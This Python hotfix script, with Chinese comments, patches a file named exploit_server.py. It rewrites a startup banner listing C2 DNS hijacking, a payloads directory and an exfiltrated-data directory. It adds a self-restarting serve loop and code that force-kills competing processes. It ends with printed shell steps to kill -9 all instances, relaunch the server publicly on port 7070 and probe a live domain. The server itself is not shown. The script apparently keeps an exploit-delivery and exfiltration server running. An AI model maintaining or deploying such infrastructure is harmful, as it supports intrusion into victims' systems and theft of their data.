# -*- coding: utf-8 -*-
"""
_v204_hotfix15.py ── 🔴 终极方案: 不再行号扫. 直接 2 处精确 replace + AST 校验.

完全放弃扫描 TRY/SF 行号. 直接用 2 条 "长唯一字符串 + 高置信上下文" 精确 replace:

  REPLACE-1 (PATCH1): banner = f\"\"\" ... READY banner + log_to_file 4 行 + 老 try: server.serve_forever() 整块
                → [DS-READY-HF15] + self-connect probe + while True 永不返回

  REPLACE-2 (PATCH2): banner 正上方的代码块 (preflight setsid 刚结束) 之后
                → 插入 [PREFLIGHT-PURGE] 100% 杀残留 (setsid 结构外!)
"""
import os, sys, time, shutil, ast, re

PROJ   = '/www/wwwroot/coruna/server'
ESFILE = os.path.join(PROJ, 'exploit_server.py')
BAKDIR = os.path.join(PROJ, 'bak_v204_hotfix15')
os.makedirs(BAKDIR, exist_ok=True)

ts = time.strftime('%Y%m%d%H%M%S')
bak = os.path.join(BAKDIR, f'exploit_server.py.bak-{ts}')
shutil.copy2(ESFILE, bak)
ORIG_SIZE = os.path.getsize(ESFILE)
print(f'[BAK] {bak} (size={ORIG_SIZE})')

with open(ESFILE, 'rb') as f:
    src_bytes = f.read()
ORIG_NL = b'\r\n' if src_bytes.count(b'\r\n') > src_bytes.count(b'\n') * 0.5 else b'\n'
src = src_bytes.decode('utf-8', errors='replace').replace('\r\n', '\n').replace('\r', '\n')
print(f'[INFO] ORIG_NL={ORIG_NL!r}  src len={len(src)}')

# ═══════════════════════════════════════════════════════════════
# STEP-1: 先把 hotfix13 残留的 "旧 [DS-READY]" while 块 (若存在) 清理掉, 防止双重复
# ═══════════════════════════════════════════════════════════════
# 模式: 从 "[DS-READY] pid=" 到它匹配的 break / raise SystemExit 结束
CLEAN_HOTFIX13 = False
pat_old = re.compile(
    r'(\s*# PATCH v20\.4-HOTFIX13-B:.*?[^\n]*\n'
    r'\s*_diag_pid\s*=\s*os\.getpid\(\).*?print\("\[DS-READY\].*?\n'
    r'.*?server\.serve_forever\(\)\s*#.*?\n'
    r'\s*except BaseException as _ds_sf_e:.*?\[DS-CRASH-SF\].*?raise SystemExit\(88\)\s*\n'
    r'(?:\s*.*?\n){0,20}?\s*# PATCH v20\.4-HOTFIX13.*?end?\n)',
    re.DOTALL
)
if '[DS-READY]' in src and 'DS-READY-HF15' not in src:
    m_old = pat_old.search(src)
    if m_old:
        CLEAN_HOTFIX13 = True
        print(f'[CLEAN] ✅ 匹配到 HOTFIX13 旧代码块, 长度 {len(m_old.group())} chars, 将先移除')
        src = src[:m_old.start()] + src[m_old.end():]

# ═══════════════════════════════════════════════════════════════
# REPLACE-1 (PATCH1): READY banner + log_to_file 4 行 + 老 serve_forever try/except 整块
#   → 唯一标识符: 从 "banner = f\"\"\"\n╔══════════" 开始 到 "server.shutdown()" 结束 (最后 1 块)
# ═══════════════════════════════════════════════════════════════
OLD_BLOCK_R1 = None
# 策略: 从后往前找最后 1 个 banner = f"""
R1_START = None
R1_END   = None
for m in re.finditer(r'banner\s*=\s*f"""', src):
    R1_START = m.start()
# R1_END = 从 R1_START 向后找最后 1 个 "server.shutdown()" 之后的行 (if __name__ 前)
if R1_START is not None:
    tail = src[R1_START:]
    sd_positions = [m.start() for m in re.finditer(r'server\.shutdown\(\)', tail)]
    if sd_positions:
        # 取最后 1 个 server.shutdown() 作为 R1_END anchor
        last_sd_off = sd_positions[-1]
        # 从 last_sd_off 往后扫到 '\n' 末尾
        line_end = tail.find('\n', last_sd_off)
        if line_end < 0: line_end = len(tail)
        R1_END_rel = line_end
        R1_END = R1_START + R1_END_rel
if R1_START is None or R1_END is None or R1_END <= R1_START:
    print(f'[FATAL] R1_START={R1_START} R1_END={R1_END} 无法定位!')
    sys.exit(1)
OLD_STR_R1 = src[R1_START : R1_END]
print(f'[PATCH1-R1] OFFSET {R1_START}:{R1_END} = {R1_END - R1_START} chars')
print(f'[PATCH1-R1] FIRST 160 chars:\n  {"│ ".join(OLD_STR_R1[:160].splitlines(True))}')
print(f'[PATCH1-R1] LAST  160 chars:\n  {"│ ".join(OLD_STR_R1[-160:].splitlines(True))}')
# 判定缩进: 第 1 行 banner 行的前导空格
banner_line_1 = OLD_STR_R1.split('\n', 1)[0]
R1_INDENT_STR = banner_line_1[: len(banner_line_1) - len(banner_line_1.lstrip(' '))]
R1_INDENT_N   = len(R1_INDENT_STR)
if R1_INDENT_N < 4:
    print(f'[FATAL] R1_INDENT_N={R1_INDENT_N} 异常 (<4), 说明 banner 不在 main() 里, 停下!')
    sys.exit(1)
print(f'[PATCH1-INDENT] R1_INDENT_N={R1_INDENT_N} (main 函数体缩进 8 或 4, 正常)')

# 构造 NEW_STR_R1
TI = R1_INDENT_STR                # e.g. 8 spaces (inside def main())
SI = TI + '    '                  # 12 spaces: try 内部
DI = TI + '        '              # SI + 4 (except inside try)
SDI= TI + '            '          # DI + 4 (内部 if/for)
NEW_STR_R1 = f'''{TI}banner = f"""
{TI}╔══════════════════════════════════════════════════════════════╗
{TI}║              EXPLOIT SERVER - READY                          ║
{TI}╠══════════════════════════════════════════════════════════════╣
{TI}║  Access URL:     http://{{args.host}}:{{args.port}}/
{TI}║                  http://localhost:{{args.port}}/
{TI}║  C2 DNS hijack:  Internal DNS -> {{args.host}}:80 (if bound)
{TI}║  Payloads dir:   {{PAYLOADS_DIR}}
{TI}║  Templates dir:  {{TEMPLATES_DIR}}
{TI}║  Exfil data dir: {{EXFIL_DIR}}
{TI}║  Log file:       {{LOG_FILE}}
{TI}║  DB available:   {{DB_AVAILABLE}}
{TI}╚══════════════════════════════════════════════════════════════╝
{TI}"""
{TI}if C2_HOST:
{TI}    banner += f"║  C2 Host:        {{C2_HOST}}\\n"
{TI}if REDIRECT_URL:
{TI}    banner += f"║  Redirect URL:   {{REDIRECT_URL}}\\n"
{TI}banner += "╚══════════════════════════════════════════════════════════════╝\\n"
{TI}banner += "\\n[!] Press Ctrl+C to stop\\n"
{TI}
{TI}print(banner)
{TI}startup_log = f"Exploit server started on http://{{args.host}}:{{args.port}} | DB={{DB_AVAILABLE}}"
{TI}log_to_file(startup_log)
{TI}log_to_file(f"Payloads: {{PAYLOADS_DIR}}")
{TI}log_to_file(f"Exfil dir: {{EXFIL_DIR}}")
{TI}log_to_file(f"Log file: {{LOG_FILE}}")
{TI}
{TI}# PATCH v20.4-HOTFIX15-R1: 永不返回模式: [DS-READY-HF15] 打印 + self-connect probe + while True.
{TI}import socket as _diag_sk, os as _diag_os, sys as _diag_sys, time as _diag_tm
{TI}try:
{TI}    _ds_pid  = _diag_os.getpid()
{TI}    _ds_ppid = _diag_os.getppid()
{TI}    _ds_pgid = _diag_os.getpgrp() if hasattr(_diag_os, "getpgrp") else -1
{TI}    print(f"[DS-READY-HF15] pid={{_ds_pid}} ppid={{_ds_ppid}} pgid={{_ds_pgid}} port={{args.port}} → ENTER INFINITE serve_forever LOOP", flush=True)
{TI}    _diag_sys.stdout.flush(); _diag_sys.stderr.flush()
{TI}    _s1 = _diag_sk.socket(_diag_sk.AF_INET, _diag_sk.SOCK_STREAM)
{TI}    _rr = _s1.connect_ex(("127.0.0.1", int(args.port)))
{TI}    print(f"[DS-READY-HF15] 127.0.0.1:{{args.port}} self-connect_ex={{_rr}} (0=LISTEN OK)", flush=True)
{TI}    _s1.close()
{TI}except Exception as _diag_e:
{TI}    print(f"[DS-READY-HF15] probe err {{type(_diag_e).__name__}}: {{_diag_e}}", flush=True)
{TI}
{TI}_ds_attempt = 0
{TI}while True:
{TI}    _ds_attempt += 1
{TI}    print(f"[DS-SF-LOOP] attempt={{_ds_attempt}} → server.serve_forever(poll=0.3)", flush=True)
{TI}    try:
{SI}server.serve_forever(poll_interval=0.3)
{DI}except KeyboardInterrupt:
{SI}stop_msg = "Server stopped by user."
{SI}print(f"\\n[*] {{stop_msg}}")
{SI}try: log_to_file(stop_msg)
{SI}except Exception: pass
{SI}try: server.shutdown()
{SI}except Exception: pass
{SI}break
{DI}except SystemExit as _ds_se:
{SI}print(f"[DS-SF-EXIT] SystemExit(code={{_ds_se.code}}) → propagate.", flush=True)
{SI}try: log_to_file(f"[DS-SF-EXIT] SystemExit {{_ds_se.code}}")
{SI}except Exception: pass
{SI}raise
{DI}except BaseException as _ds_sf_e:
{SI}import traceback as _ds_tb
{SI}_ts = _diag_tm.strftime("%Y-%m-%d %H:%M:%S")
{SI}_msg = f"[DS-CRASH-SF-{{_ds_attempt}}] [{{_ts}}] pid={{_ds_pid}} {{type(_ds_sf_e).__name__}}: {{_ds_sf_e}}"
{SI}print(_msg, flush=True)
{SI}try: log_to_file(_msg)
{SI}except Exception: pass
{SI}_ds_tb.print_exc()
{SI}if _ds_attempt >= 5:
{SDI}    print(f"[DS-CRASH-SF] serve_forever 连续崩溃 {{_ds_attempt}} 次 → 终止 SystemExit(88).", flush=True)
{SDI}    raise SystemExit(88)
{SI}print(f"[DS-CRASH-SF] 3s 后第 {{_ds_attempt+1}} 次重启 serve_forever loop...", flush=True)
{SI}try: _diag_tm.sleep(3)
{SDI}except (KeyboardInterrupt, SystemExit): pass
{SI}try: server.shutdown()
{SI}except Exception: pass
{SI}try: server.server_close()
{SI}except Exception: pass
{SI}_diag_tm.sleep(2)
{SI}try:
{SDI}    print(f"[DS-SF-REBIND] attempt {{_ds_attempt+1}} 重新 bind ReusableThreadingHTTPServer...", flush=True)
{SDI}    server = ReusableThreadingHTTPServer((args.host, args.port), DarkSwordHandler)
{SI}except Exception as _rebind_e:
{SDI}    print(f"[DS-SF-REBIND] 失败: {{type(_rebind_e).__name__}}: {{_rebind_e}}. 2s 后循环再试", flush=True)
{SDI}    _diag_tm.sleep(2)
{TI}print(f"[DS-SF-LOOP-END] (永不返回区: KeyboardInterrupt/SystemExit 才会触发).", flush=True)
'''

# 校验 NEW_STR_R1 缩进正确
assert NEW_STR_R1.startswith(TI + 'banner = f"""'), "NEW 首行 banner 缩进错!"
# 替换
src = src[:R1_START] + NEW_STR_R1 + src[R1_END:]
print(f'[PATCH1-R1] ✅ 替换 {R1_END - R1_START} chars → {len(NEW_STR_R1)} chars')

# ═══════════════════════════════════════════════════════════════
# REPLACE-2 (PATCH2): banner 正上方 (banner = f""" 前一个非空行之后) 插入 PURGE 残留
# ═══════════════════════════════════════════════════════════════
R2_INSERT_AT = src.find('\n' + TI + 'banner = f"""')
if R2_INSERT_AT < 0:
    R2_INSERT_AT = src.find(TI + 'banner = f"""')
if R2_INSERT_AT < 0:
    print('[FATAL] R2 找不到 banner = f""" 锚点!'); sys.exit(1)
# 后退几行找 '\n' 之前的锚点 (找到前一段末尾)
print(f'[PATCH2-R2] INSERT AT off={R2_INSERT_AT}  banner indent={len(TI)}')
PURGE = f'''
{TI}# PATCH v20.4-HOTFIX15-R2: 100% 清理除 self 外所有 exploit_server.py 残留进程 (PREFLIGHT "精确单杀" 漏杀会导致残留 worker 持 LISTEN 抢端口!)
{TI}try:
{TI}    import subprocess as _ds_sp, signal as _ds_sg, os as _ds_os, time as _ds_tm
{TI}    _my_pid = _ds_os.getpid()
{TI}    try:
{TI}        _ps_out = _ds_sp.run(["pgrep", "-af", "exploit_server.py"],
{TI}                              stdout=_ds_sp.PIPE, stderr=_ds_sp.DEVNULL, timeout=4, check=False).stdout.decode("utf-8","ignore")
{TI}    except Exception:
{TI}        _ps_out = ""
{TI}    _kp = []
{TI}    for _pln in _ps_out.splitlines():
{TI}        try:
{TI}            _parts = _pln.split(None, 1)
{TI}            if not _parts: continue
{TI}            _p = int(_parts[0])
{TI}            if _p != _my_pid and _p > 1 and _p != _ds_os.getppid():
{TI}                _cmd = (_parts[1] if len(_parts) > 1 else '').lower()
{TI}                if ('exploit_server' in _cmd) and ('nginx' not in _cmd) and ('mysqld' not in _cmd):
{TI}                    _kp.append(_p)
{TI}        except Exception:
{TI}            continue
{TI}    if _kp:
{TI}        print(f"[PREFLIGHT-PURGE] 🔴 清理残留 exploit_server.py PIDs={{sorted(_kp)}} (self={{_my_pid}})", flush=True)
{TI}        for _p in _kp:
{TI}            try: _ds_os.kill(_p, _ds_sg.SIGKILL)
{TI}            except Exception: pass
{TI}        _ds_tm.sleep(1.5)
{TI}except Exception:
{TI}    pass
'''
# 插入位置 = R2_INSERT_AT ( banner = f""" 前面)
src = src[:R2_INSERT_AT] + PURGE + src[R2_INSERT_AT:]
print(f'[PATCH2-R2] ✅ PURGE 插入 {len(PURGE)} chars 于 off={R2_INSERT_AT}')

# ═══════════════════════════════════════════════════════════════
# SYNTAX
# ═══════════════════════════════════════════════════════════════
try:
    ast.parse(src)
    print('[SYNTAX] ✅ ast.parse PASS')
except SyntaxError as e:
    print(f'[SYNTAX] ❌ L{e.lineno} off={e.offset}: {e.msg}')
    fl = src.split('\n')
    for ek in range(max(1, e.lineno-4), min(len(fl), e.lineno+4)):
        print(f'  L{ek:4d}|{fl[ek-1][:160]}')
    shutil.copy2(bak, ESFILE)
    sys.exit(1)

# 写回
if ORIG_NL == b'\r\n':
    fb = src.replace('\n', '\r\n').encode('utf-8')
else:
    fb = src.encode('utf-8')
with open(ESFILE, 'wb') as f:
    f.write(fb)
NEW_SIZE = os.path.getsize(ESFILE)
print(f'[WRITE] before={ORIG_SIZE} after={NEW_SIZE} delta={NEW_SIZE-ORIG_SIZE:+d}')

# VERIFY markers
def gm(p):
    return sorted(set(1 + src[:m.start()].count('\n') for m in re.finditer(p, src, re.MULTILINE)))
print(f'[VERIFY] DS-READY-HF15      L={gm(r"DS-READY-HF15")}')
print(f'[VERIFY] DS-SF-LOOP          L={gm(r"DS-SF-LOOP")}')
print(f'[VERIFY] DS-CRASH-SF         L={gm(r"DS-CRASH-SF")}')
print(f'[VERIFY] PREFLIGHT-PURGE     L={gm(r"PREFLIGHT-PURGE")}')
print(f'[VERIFY] SystemExit\\(88\\)     L={gm(r"SystemExit\\(88\\)")}')
print(f'[VERIFY] CH-SAFE-302(hf12v3) L={gm(r"CH-SAFE-302-(OK|SKIP)")}')
# 必须: 老 [DS-READY] (没有 -HF15 后缀) 的出现次数要是 0!
old_dsr = gm(r'DS-READY[^-A-Za-z0-9_]')
print(f'[VERIFY] 旧 DS-READY 次数      L={old_dsr} (应 0 或 1 处残留注释)')
if any(src.split('\n')[L-1].lstrip().startswith('print(f"[DS-READY]')) or \
       src.split('\n')[L-1].lstrip().startswith("print(f'[DS-READY]")
       for L in old_dsr if 0 < L <= len(src.split('\n'))):
    print('[VERIFY-WARN] 仍存在旧 [DS-READY] 的 print 语句! (意味着 R1 替换没命中, 或 R1_START/R1_END 选错)')
print('✅ HOTFIX15 完成!')
print()
print('👉 启动命令 (必须 100% 清残留 + DS_SKIP_PREFLIGHT_SETSID=1):')
print('   pkill -9 -f exploit_server.py')
print('   fuser -k 7070/tcp 2>/dev/null ; sleep 2')
print('   for p in $(grep -l exploit_server /proc/[0-9]*/cmdline 2>/dev/null | awk -F/ \'{{print $3}}\'); do [ "$p" != "$$" ] && [ "$p" -gt 1 ] && kill -9 $p 2>/dev/null; done')
print('   sleep 3 ; ss -lntp | grep -E ":7070|:7000" ; pgrep -af exploit_server.py')
print('   (上面 ss+pgrep 必须空! 否则再重复 pkill)')
print('   export DS_SKIP_PREFLIGHT_SETSID=1')
print('   cd /www/wwwroot/coruna/server')
print('   nohup /www/server/pyporject_evn/versions/3.12.13/bin/python3 -u exploit_server.py -H 0.0.0.0 -p 7070 --no-port-80 > /tmp/exploit_server.log 2>&1 &')
print('   echo NEW_PID=$! ; sleep 8')
print('   grep -nE "PREFLIGHT-PURGE|DS-READY-HF15|DS-SF-LOOP|DS-CRASH-SF|self-connect_ex=" /tmp/exploit_server.log')
print('   ss -lntp | grep -E ":7070|:7000|:80|:443"')
print('   curl -sS -o /dev/null -w "C1 test001  code=%{http_code} loc=%{redirect_url} size=%{size_download}\\n" --max-time 8 http://127.0.0.1:7070/ch/test001')
print('   curl -sS -o /dev/null -w "C2 nonexist code=%{http_code} loc=%{redirect_url} size=%{size_download}\\n" --max-time 8 http://127.0.0.1:7070/ch/notexist_xyz')
print('   curl -sk -o /dev/null -w "C3 HTTPS t code=%{http_code} loc=%{redirect_url} size=%{size_download}\\n" --max-time 15 https://aa1234.dpdns.org/ch/test001')
print('   curl -sk -o /dev/null -w "C4 HTTPS n code=%{http_code} loc=%{redirect_url} size=%{size_download}\\n" --max-time 15 https://aa1234.dpdns.org/ch/notexist_xyz')
